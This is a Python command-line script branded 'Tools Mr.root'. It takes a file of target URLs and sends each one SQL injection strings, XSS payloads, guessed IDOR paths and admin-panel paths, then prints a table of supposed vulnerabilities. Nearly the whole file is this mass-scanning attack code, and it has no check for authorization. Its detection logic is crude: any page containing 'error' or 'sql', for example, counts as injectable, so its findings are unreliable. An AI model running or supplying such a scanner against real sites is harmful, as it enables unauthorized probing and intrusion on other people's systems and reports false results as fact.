import time
import os
import pyfiglet
from tqdm import tqdm
from termcolor import colored
from prettytable import PrettyTable
import requests

# Welcome message with progress bar
def show_welcome_message():
    for i in tqdm(range(100), desc="Loading"):
        time.sleep(0.05)

    os.system('clear' if os.name == 'posix' else 'cls')
    banner = pyfiglet.figlet_format("Welcome to Tools")
    print(colored(banner, "cyan"))

    time.sleep(5)
    os.system('clear' if os.name == 'posix' else 'cls')

# Display tool name
def show_tool_name():
    tool_name = pyfiglet.figlet_format("Tools Mr.root")
    print(colored(tool_name, "green"))

# Scan for SQL Injection vulnerabilities
def scan_sql_injection(url):
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "admin' --", "' UNION SELECT null, null --"]
    for payload in payloads:
        vulnerable_url = f"{url}?id={payload}"
        try:
            response = requests.get(vulnerable_url, timeout=5).text
            if "error" in response.lower() or "sql" in response.lower():
                confirm_response = requests.get(vulnerable_url, timeout=5).text
                if "error" in confirm_response.lower() or "sql" in confirm_response.lower():
                    return True, vulnerable_url
        except Exception:
            continue
    return False, None

# Scan for XSS vulnerabilities
def scan_xss(url):
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'';!--\"<XSS>=&{()}"]
    for payload in payloads:
        vulnerable_url = f"{url}?q={payload}"
        try:
            response = requests.get(vulnerable_url, timeout=5).text
            if payload in response:
                confirm_response = requests.get(vulnerable_url, timeout=5).text
                if payload in confirm_response:
                    return True, vulnerable_url
        except Exception:
            continue
    return False, None

# Scan for IDOR vulnerabilities
def scan_idor(url):
    sensitive_paths = ["/user/1", "/user/2", "/account/1001", "/account/1002"]
    for path in sensitive_paths:
        test_url = f"{url}{path}"
        try:
            response = requests.get(test_url, timeout=5).text
            if "unauthorized" not in response.lower() and "not found" not in response.lower():
                confirm_response = requests.get(test_url, timeout=5).text
                if "unauthorized" not in confirm_response.lower() and "not found" not in confirm_response.lower():
                    return True, test_url
        except Exception:
            continue
    return False, None

# Scan for Admin Bypass vulnerabilities
def scan_bypass_admin(url):
    paths = ["/admin", "/admin/dashboard", "/admin/panel"]
    for path in paths:
        test_url = f"{url}{path}"
        try:
            response = requests.get(test_url, timeout=5).text
            if "welcome admin" in response.lower() or "admin panel" in response.lower():
                confirm_response = requests.get(test_url, timeout=5).text
                if "welcome admin" in confirm_response.lower() or "admin panel" in confirm_response.lower():
                    return True, test_url
        except Exception:
            continue
    return False, None

# Main program
def main():
    # Display welcome message and tool name
    show_welcome_message()
    show_tool_name()

    # Request the file name
    filename = input("Enter the filename containing the list of URLs (e.g., list.txt): ").strip()
    if not os.path.exists(filename):
        print(colored("File not found. Please check the filename and path.", "red"))
        return

    # Load URLs from file
    with open(filename, "r") as file:
        urls = [line.strip() for line in file if line.strip()]

    if not urls:
        print(colored("The file is empty or contains invalid URLs.", "red"))
        return

    # Initialize results table
    results_table = PrettyTable()
    results_table.field_names = ["URL", "Vulnerability", "Full Path"]
    results_table.align = "l"

    # Scan each URL
    for url in urls:
        print(f"\nScanning: {url}")
        found = False

        # SQL Injection
        sql_injection, sql_path = scan_sql_injection(url)
        if sql_injection:
            results_table.add_row([colored(url, "green"), "SQL Injection", sql_path])
            print(colored(f"[+] Found SQL Injection: {sql_path}", "green"))
            found = True

        # XSS
        xss, xss_path = scan_xss(url)
        if xss:
            results_table.add_row([colored(url, "green"), "XSS", xss_path])
            print(colored(f"[+] Found XSS: {xss_path}", "green"))
            found = True

        # IDOR
        idor, idor_path = scan_idor(url)
        if idor:
            results_table.add_row([colored(url, "green"), "IDOR", idor_path])
            print(colored(f"[+] Found IDOR: {idor_path}", "green"))
            found = True

        # Admin Bypass
        bypass, bypass_path = scan_bypass_admin(url)
        if bypass:
            results_table.add_row([colored(url, "green"), "Admin Bypass", bypass_path])
            print(colored(f"[+] Found Admin Bypass: {bypass_path}", "green"))
            found = True

        if not found:
            print(colored(f"[-] No vulnerabilities found for {url}", "red"))

    # Display results
    print("\nScan Results:")
    print(results_table)

if __name__ == "__main__":
    main()
